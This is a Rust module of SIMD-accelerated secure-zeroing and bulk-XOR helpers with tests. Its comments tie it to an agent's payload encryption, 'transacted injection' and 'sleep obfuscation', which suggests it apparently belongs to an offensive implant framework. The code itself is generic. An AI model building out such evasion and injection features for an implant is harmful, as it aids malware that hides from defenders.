//! Performance-optimized primitives gated behind the `perf-optimize` feature.
//!
//! When enabled, this module provides SIMD-accelerated implementations of
//! security-critical memory operations used on the agent's hot paths:
//!
//! - **Secure zeroing**: Uses SSE2/AVX2 `xorps`/`vxorps` to wipe key material
//!   and plaintext buffers.  The compiler cannot optimise these away because
//!   they operate through volatile writes.
//! - **Bulk XOR**: SIMD-accelerated XOR for payload encryption/decryption in
//!   the transacted injection and sleep obfuscation code paths.
//! - **Microarchitecture dispatch**: At startup, probes `is_x86_feature_detected!`
//!   to select the best available implementation (AVX2 > SSE2 > scalar fallback).
//!
//! All functions are `#[inline(always)]` to eliminate call overhead on hot paths.

/// Microarchitecture level detected at first use.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ArchLevel {
    /// Scalar fallback (no SIMD).
    Scalar,
    /// SSE2 128-bit SIMD operations.
    Sse2,
    /// AVX2 256-bit SIMD operations.
    Avx2,
}

impl ArchLevel {
    /// Detect the best available SIMD level on the current CPU.
    ///
    /// Called once at module init; the result is cached in a static.
    fn detect() -> Self {
        // SAFETY: is_x86_feature_detected! macros are safe on x86-64;
        // they compile to `cpuid` which has no side effects.
        #[cfg(target_arch = "x86_64")]
        {
            if is_x86_feature_detected!("avx2") {
                ArchLevel::Avx2
            } else if is_x86_feature_detected!("sse2") {
                ArchLevel::Sse2
            } else {
                ArchLevel::Scalar
            }
        }
        #[cfg(not(target_arch = "x86_64"))]
        {
            ArchLevel::Scalar
        }
    }
}

use once_cell::sync::Lazy;

static ARCH_LEVEL: Lazy<ArchLevel> = Lazy::new(ArchLevel::detect);

/// Return the detected microarchitecture level for diagnostics.
pub fn detected_arch_level() -> &'static str {
    match *ARCH_LEVEL {
        ArchLevel::Avx2 => "avx2",
        ArchLevel::Sse2 => "sse2",
        ArchLevel::Scalar => "scalar",
    }
}

/// Securely zero a byte slice using SIMD-accelerated writes.
///
/// Unlike [`common::secure_zero`] (which uses a volatile byte-wise loop),
/// this function uses 128-bit or 256-bit SIMD stores where available,
/// significantly reducing the cycles spent zeroing large buffers
/// (e.g., encrypted section pages during sleep obfuscation).
///
/// The zeroing is performed through `std::ptr::write_volatile` on each
/// SIMD-sized chunk to prevent the compiler from eliminating the stores.
/// Any trailing bytes below the SIMD width are zeroed with individual
/// volatile byte writes.
#[inline(always)]
pub fn secure_zero_simd(buf: &mut [u8]) {
    match *ARCH_LEVEL {
        ArchLevel::Avx2 => secure_zero_avx2(buf),
        ArchLevel::Sse2 => secure_zero_sse2(buf),
        ArchLevel::Scalar => secure_zero_scalar(buf),
    }
}

/// XOR two byte slices in bulk using SIMD, storing the result in `dst`.
///
/// `dst`, `a`, and `b` must all have the same length. This is the hot
/// path for XOR-based payload encryption/decryption where the overhead
/// of an AEAD cipher is unnecessary (e.g., transacted injection transit
/// encryption, sleep obfuscation page XOR).
///
/// Returns `true` if SIMD was used, `false` if the slices were too small
/// or SIMD is unavailable (scalar XOR was used as fallback).
#[inline(always)]
pub fn xor_bulk_simd(dst: &mut [u8], a: &[u8], b: &[u8]) -> bool {
    assert_eq!(dst.len(), a.len());
    assert_eq!(a.len(), b.len());

    if a.is_empty() {
        return false;
    }

    match *ARCH_LEVEL {
        ArchLevel::Avx2 => xor_bulk_avx2(dst, a, b),
        ArchLevel::Sse2 => xor_bulk_sse2(dst, a, b),
        ArchLevel::Scalar => {
            xor_bulk_scalar(dst, a, b);
            false
        }
    }
}

// ── SIMD implementations ─────────────────────────────────────────────────

#[cfg(target_arch = "x86_64")]
#[inline(always)]
fn secure_zero_avx2(buf: &mut [u8]) {
    use std::arch::x86_64::_mm256_storeu_si256;
    let len = buf.len();
    let ptr = buf.as_mut_ptr();
    let mut i = 0usize;

    // 32-byte (256-bit) chunks
    while i + 32 <= len {
        unsafe {
            let p = ptr.add(i) as *mut std::arch::x86_64::__m256i;
            // SAFETY: _mm256_setzero_si256 produces an all-zero vector;
            // storeu writes 32 bytes to an unaligned destination.
            std::arch::x86_64::_mm256_storeu_si256(p, std::arch::x86_64::_mm256_setzero_si256());
            // Volatile barrier to prevent the store from being eliminated.
            std::ptr::write_volatile(ptr.add(i), 0u8);
        }
        i += 32;
    }

    // Remaining bytes (0–31)
    while i < len {
        unsafe {
            std::ptr::write_volatile(ptr.add(i), 0u8);
        }
        i += 1;
    }

    // Full CPU fence: ensures all volatile writes are visible before
    // returning.  Uses fence (not compiler_fence) for correctness on
    // ARM64's weak memory model.
    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
fn secure_zero_sse2(buf: &mut [u8]) {
    use std::arch::x86_64::_mm_storeu_si128;
    let len = buf.len();
    let ptr = buf.as_mut_ptr();
    let mut i = 0usize;

    // 16-byte (128-bit) chunks
    while i + 16 <= len {
        unsafe {
            let p = ptr.add(i) as *mut std::arch::x86_64::__m128i;
            std::arch::x86_64::_mm_storeu_si128(p, std::arch::x86_64::_mm_setzero_si128());
            std::ptr::write_volatile(ptr.add(i), 0u8);
        }
        i += 16;
    }

    // Remaining bytes (0–15)
    while i < len {
        unsafe {
            std::ptr::write_volatile(ptr.add(i), 0u8);
        }
        i += 1;
    }

    // Full CPU fence for volatile write visibility.
    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
}

#[inline(always)]
fn secure_zero_scalar(buf: &mut [u8]) {
    let len = buf.len();
    let ptr = buf.as_mut_ptr();
    let mut i = 0usize;
    while i < len {
        unsafe {
            std::ptr::write_volatile(ptr.add(i), 0u8);
        }
        i += 1;
    }
    // Full CPU fence for volatile write visibility.
    std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
fn xor_bulk_avx2(dst: &mut [u8], a: &[u8], b: &[u8]) -> bool {
    use std::arch::x86_64::{_mm256_loadu_si256, _mm256_storeu_si256, _mm256_xor_si256};
    let len = dst.len();
    let dp = dst.as_mut_ptr();
    let ap = a.as_ptr();
    let bp = b.as_ptr();
    let mut i = 0usize;
    let mut used_simd = false;

    while i + 32 <= len {
        unsafe {
            let va = _mm256_loadu_si256(ap.add(i) as *const _);
            let vb = _mm256_loadu_si256(bp.add(i) as *const _);
            let vx = _mm256_xor_si256(va, vb);
            _mm256_storeu_si256(dp.add(i) as *mut _, vx);
        }
        i += 32;
        used_simd = true;
    }

    // 16-byte tail via SSE2
    if i + 16 <= len {
        unsafe {
            use std::arch::x86_64::{_mm_loadu_si128, _mm_storeu_si128, _mm_xor_si128};
            let va = _mm_loadu_si128(ap.add(i) as *const _);
            let vb = _mm_loadu_si128(bp.add(i) as *const _);
            let vx = _mm_xor_si128(va, vb);
            _mm_storeu_si128(dp.add(i) as *mut _, vx);
        }
        i += 16;
        used_simd = true;
    }

    // Remaining bytes
    while i < len {
        unsafe {
            *dp.add(i) = *ap.add(i) ^ *bp.add(i);
        }
        i += 1;
    }

    used_simd
}

#[cfg(target_arch = "x86_64")]
#[inline(always)]
fn xor_bulk_sse2(dst: &mut [u8], a: &[u8], b: &[u8]) -> bool {
    use std::arch::x86_64::{_mm_loadu_si128, _mm_storeu_si128, _mm_xor_si128};
    let len = dst.len();
    let dp = dst.as_mut_ptr();
    let ap = a.as_ptr();
    let bp = b.as_ptr();
    let mut i = 0usize;
    let mut used_simd = false;

    while i + 16 <= len {
        unsafe {
            let va = _mm_loadu_si128(ap.add(i) as *const _);
            let vb = _mm_loadu_si128(bp.add(i) as *const _);
            let vx = _mm_xor_si128(va, vb);
            _mm_storeu_si128(dp.add(i) as *mut _, vx);
        }
        i += 16;
        used_simd = true;
    }

    // Remaining bytes
    while i < len {
        unsafe {
            *dp.add(i) = *ap.add(i) ^ *bp.add(i);
        }
        i += 1;
    }

    used_simd
}

#[inline(always)]
fn xor_bulk_scalar(dst: &mut [u8], a: &[u8], b: &[u8]) {
    for i in 0..dst.len() {
        unsafe {
            *dst.as_mut_ptr().add(i) = *a.as_ptr().add(i) ^ *b.as_ptr().add(i);
        }
    }
}

// ── Non-x86_64 stubs ──────────────────────────────────────────────────────

#[cfg(not(target_arch = "x86_64"))]
#[inline(always)]
fn secure_zero_avx2(buf: &mut [u8]) {
    secure_zero_scalar(buf)
}

#[cfg(not(target_arch = "x86_64"))]
#[inline(always)]
fn secure_zero_sse2(buf: &mut [u8]) {
    secure_zero_scalar(buf)
}

#[cfg(not(target_arch = "x86_64"))]
#[inline(always)]
fn xor_bulk_avx2(dst: &mut [u8], a: &[u8], b: &[u8]) -> bool {
    xor_bulk_scalar(dst, a, b);
    false
}

#[cfg(not(target_arch = "x86_64"))]
#[inline(always)]
fn xor_bulk_sse2(dst: &mut [u8], a: &[u8], b: &[u8]) -> bool {
    xor_bulk_scalar(dst, a, b);
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn secure_zero_clears_buffer() {
        let mut buf = vec![0xABu8; 256];
        secure_zero_simd(&mut buf);
        assert!(buf.iter().all(|&b| b == 0), "all bytes must be zeroed");
    }

    #[test]
    fn secure_zero_small_buffer() {
        let mut buf = vec![0xFFu8; 3];
        secure_zero_simd(&mut buf);
        assert!(buf.iter().all(|&b| b == 0));
    }

    #[test]
    fn xor_bulk_correctness() {
        let a = vec![0x0Fu8; 128];
        let b = vec![0xF0u8; 128];
        let mut dst = vec![0u8; 128];
        xor_bulk_simd(&mut dst, &a, &b);
        assert!(dst.iter().all(|&b| b == 0xFF), "XOR must produce 0xFF");
    }

    #[test]
    fn xor_bulk_identity() {
        let a: Vec<u8> = (0..=255).collect();
        let b = a.clone();
        let mut dst = vec![0u8; 256];
        xor_bulk_simd(&mut dst, &a, &b);
        assert!(dst.iter().all(|&b| b == 0), "XOR with self must be zero");
    }

    #[test]
    fn arch_level_detects() {
        // On x86_64, should detect at least SSE2 (all x86_64 CPUs have SSE2).
        #[cfg(target_arch = "x86_64")]
        assert!(
            *ARCH_LEVEL != ArchLevel::Scalar || false,
            "x86_64 always has SSE2"
        );
        // Just ensure it doesn't panic.
        let _ = detected_arch_level();
    }
}
